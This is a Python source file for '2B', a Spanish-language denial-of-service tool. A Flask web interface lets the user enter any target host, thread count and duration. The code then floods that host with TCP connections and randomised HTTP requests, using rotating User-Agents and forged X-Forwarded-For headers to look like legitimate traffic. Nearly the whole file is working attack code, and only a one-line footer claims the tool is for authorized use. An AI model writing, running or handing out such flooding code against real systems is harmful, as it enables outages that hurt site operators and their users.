#!/usr/bin/env python3
import os
import sys
import socket
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request

app = Flask(__name__)

# Configuración global
VERSION = "2B v1.3"
DEFAULT_THREADS = 500
DEFAULT_DURATION = 60  # segundos

# User-Agents realistas
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
]

# Puertos comunes a probar
COMMON_PORTS = [80, 443, 8080, 8000, 8888, 8443, 81, 3000, 5000, 9000]

class AttackController:
    def __init__(self):
        self.is_attacking = False
        self.active_threads = 0
        self.last_stats = {"requests": 0, "errors": 0}
        self.start_time = 0

    def generate_http_request(self, target, port):
        """Genera una petición HTTP realista con headers aleatorios"""
        method = random.choice(["GET", "POST", "HEAD"])
        path = random.choice(["/", "/index.html", "/api/v1/test", "/wp-admin", "/static/img.png"])
        host_header = target if ":" not in target else target.split(":")[0]
        
        headers = [
            f"User-Agent: {random.choice(USER_AGENTS)}",
            f"Host: {host_header}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate",
            "Connection: keep-alive",
            f"X-Forwarded-For: {'.'.join(str(random.randint(1, 255)) for _ in range(4)}"
        ]
        
        if method == "POST":
            headers.append("Content-Type: application/x-www-form-urlencoded")
            headers.append(f"Content-Length: {random.randint(10, 1000)}")
            body = "data=" + "a" * random.randint(10, 100)
            return f"{method} {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n" + body
        else:
            return f"{method} {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"

    def tcp_flood(self, target, port, duration):
        """Ataque TCP flood con sockets reales"""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        
        while self.is_attacking and time.time() < end_time:
            try:
                sock.connect((target, port))
                
                if port in [80, 8080, 8000, 8888, 81, 3000]:
                    # Para puertos HTTP, envía peticiones realistas
                    request = self.generate_http_request(target, port)
                    sock.send(request.encode())
                else:
                    # Para otros puertos, envía datos aleatorios
                    sock.send(os.urandom(random.randint(64, 1024)))
                
                self.last_stats["requests"] += 1
                time.sleep(random.uniform(0.01, 0.5))  # Delay aleatorio
                sock.close()
                
                # Crear nuevo socket para cada conexión
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
            except Exception:
                self.last_stats["errors"] += 1
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                time.sleep(random.uniform(0.1, 1.0))
        
        sock.close()
        self.active_threads -= 1

    def start_attack(self, target, port, threads, duration):
        """Inicia el ataque con múltiples hilos"""
        if ":" in target:
            target, port = target.split(":")
            port = int(port)
        
        self.is_attacking = True
        self.active_threads = threads
        self.last_stats = {"requests": 0, "errors": 0}
        self.start_time = time.time()
        
        print(f"\n[2B] Iniciando ataque contra {target}:{port}")
        print(f"[2B] Hilos: {threads} | Duración: {duration} segundos")
        print("[2B] Presiona Ctrl+C en la terminal web para detener\n")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(self.tcp_flood, target, port, duration)
        
        # Esperar a que todos los hilos terminen
        while self.active_threads > 0:
            time.sleep(1)
        
        self.is_attacking = False
        return True

controller = AttackController()

# HTML Template para la interfaz web
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>2B - Herramienta Avanzada</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #111;
            color: #0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            border: 1px solid #333;
            padding: 20px;
            border-radius: 5px;
            background-color: #222;
        }
        h1 {
            color: #f00;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input, select {
            width: 100%;
            padding: 8px;
            background-color: #333;
            border: 1px solid #444;
            color: #0f0;
            border-radius: 3px;
        }
        button {
            background-color: #f00;
            color: white;
            border: none;
            padding: 10px 15px;
            cursor: pointer;
            border-radius: 3px;
            font-weight: bold;
        }
        button:hover {
            background-color: #d00;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 3px;
            background-color: #1a1a1a;
        }
        .stats {
            margin-top: 10px;
            font-size: 14px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            text-align: center;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>2B - Herramienta Avanzada</h1>
        <form method="POST">
            <div class="form-group">
                <label for="target">Objetivo (IP o dominio):</label>
                <input type="text" id="target" name="target" required placeholder="ejemplo.com o 192.168.1.100">
            </div>
            
            <div class="form-group">
                <label for="port">Puerto (dejar vacío para autodetección):</label>
                <input type="number" id="port" name="port" placeholder="80">
            </div>
            
            <div class="form-group">
                <label for="threads">Número de hilos (50-1000):</label>
                <input type="number" id="threads" name="threads" value="{{ threads }}" min="50" max="1000">
            </div>
            
            <div class="form-group">
                <label for="duration">Duración (segundos):</label>
                <input type="number" id="duration" name="duration" value="{{ duration }}" min="10" max="3600">
            </div>
            
            <button type="submit" name="action" value="start">Iniciar Ataque</button>
            {% if controller.is_attacking %}
                <button type="submit" name="action" value="stop" style="background-color: #333;">Detener</button>
            {% endif %}
        </form>
        
        <div class="status">
            <h3>Estado del Sistema:</h3>
            {% if controller.is_attacking %}
                <p style="color: #f00;">ATAQUE ACTIVO</p>
                <div class="stats">
                    <p>Tiempo transcurrido: {{ (current_time - controller.start_time)|round(1) }}s</p>
                    <p>Peticiones enviadas: {{ controller.last_stats['requests'] }}</p>
                    <p>Errores: {{ controller.last_stats['errors'] }}</p>
                    <p>Hilos activos: {{ controller.active_threads }}</p>
                </div>
            {% else %}
                <p style="color: #0f0;">SISTEMA EN ESPERA</p>
                {% if controller.last_stats['requests'] > 0 %}
                    <div class="stats">
                        <p>Último ataque:</p>
                        <p>Total peticiones: {{ controller.last_stats['requests'] }}</p>
                        <p>Errores: {{ controller.last_stats['errors'] }}</p>
                    </div>
                {% endif %}
            {% endif %}
        </div>
        
        <div class="footer">
            <p>{{ version }} | Solo para uso en entornos controlados y autorizados</p>
        </div>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form.get('action')
        
        if action == 'start':
            target = request.form.get('target')
            port = request.form.get('port', '80')
            threads = int(request.form.get('threads', DEFAULT_THREADS))
            duration = int(request.form.get('duration', DEFAULT_DURATION))
            
            if not port:
                # Autodetección de puertos si no se especifica
                port = random.choice(COMMON_PORTS)
            else:
                port = int(port)
            
            # Iniciar el ataque en un hilo separado
            attack_thread = threading.Thread(
                target=controller.start_attack,
                args=(target, port, threads, duration)
            )
            attack_thread.daemon = True
            attack_thread.start()
            
        elif action == 'stop':
            controller.is_attacking = False
    
    return render_template_string(
        HTML_TEMPLATE,
        controller=controller,
        threads=DEFAULT_THREADS,
        duration=DEFAULT_DURATION,
        version=VERSION,
        current_time=time.time()
    )

def run_flask():
    app.run(host='127.0.0.1', port=5000, threaded=True)

if __name__ == '__main__':
    print(f"""
    ██████╗ ██████╗ 
    ╚════██╗╚════██╗
     █████╔╝ █████╔╝
     ╚═══██╗ ╚═══██╗
    ██████╔╝██████╔╝
    ╚═════╝ ╚═════╝  {VERSION}
    
    Iniciando interfaz web en http://127.0.0.1:5000
    """)
    
    # Verificar si estamos en Kali Linux
    if not os.path.exists('/etc/os-release') or 'Kali' not in open('/etc/os-release').read():
        print("[!] Advertencia: Este script está optimizado para Kali Linux")
    
    # Iniciar la aplicación Flask
    run_flask()